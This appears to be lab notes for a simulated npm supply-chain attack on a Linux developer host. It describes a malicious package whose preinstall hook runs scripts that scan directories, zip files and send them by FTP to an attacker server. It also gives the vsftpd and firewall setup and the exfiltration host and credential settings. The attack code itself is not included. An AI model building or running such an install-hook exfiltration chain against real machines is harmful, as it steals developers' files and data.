## Attack Detail --- Linux

- Prepare:

	- download node to run js code

	```
	sudo apt-get install node
	```

	- set up FTP service on attacker machine (Linux)
	```
	sudo apt update
	sudo apt install vsftpd -y
	# configure vsftpd
	sudo nano /etc/vsftpd.conf
	# add following lines:
	anonymous_enable=NO      # Disable anonymous access
	local_enable=YES         # Allow local users to log in
	write_enable=YES         # Enable file uploads
	chroot_local_user=YES    # Restrict users to their home directory
	pasv_enable=YES          # Enable passive mode
	pasv_min_port=40000      # Define passive port range
	pasv_max_port=50000
	
	# restart and enable vsftpd
	sudo systemctl restart vsftpd
	sudo systemctl enable vsftpd
	
	# firewall configuration
	sudo ufw allow 20/tcp
	sudo ufw allow 21/tcp
	sudo ufw allow 40000:50000/tcp
	sudo ufw reload
	
	# create an FTP User
	sudo adduser xxx
	sudo passwd xxx
	```


- Attack Steps:

	- simulated normal behaviour 

		- Linux Dev Host
			- Pre-install Software 
				- vs code, Termius, pip, python, git

			- Simulated Behaviours
				- 2, 3, 4, 5, 6, 7

	- payload execution:

		```

		```

		Files following will appear in the 'uploads' within the same directory with server.js:  
			
			- path.txt  
			- dirs_back.zip  
			- files_back.zip  

		- install malicious package
		- package.json triggers download of preinstall.js scripts
		- initiate index.js file
		- index.js trigger the execution of server.js
		- compress scanned information and send to remote host


- Custom configuration:

	- index.js:

		- 1) Modify to IP address of the PC runs server.js.  
			hostname: "127.0.0.1",    
			port: "8000",  


		- 2) Modify to IP address of the PC runs server.js  
			const host = "127.0.0.1";  
			const port = 21;  
			const user = "ftpuser";    
			const password = "12345678";  
			const remotePath = "/";	
			

	- server.js:

		- 1)  Change to IP address and port number of the PC runs server.js.  
			url: "ftp://127.0.0.1:21",  
			anonymous: false,  
			pasv_url: "127.0.0.1",  


		- 2)  Change FTP user and FTP password.  
			if (username === 'ftpuser' && password === '12345678') {

		- 3) Modify IP address and port number.  
			const httpPort = 8000;  
			server.listen(httpPort, () => {  
			console.log(`HTTP Server listening on http://127.0.0.1:${httpPort}`);  


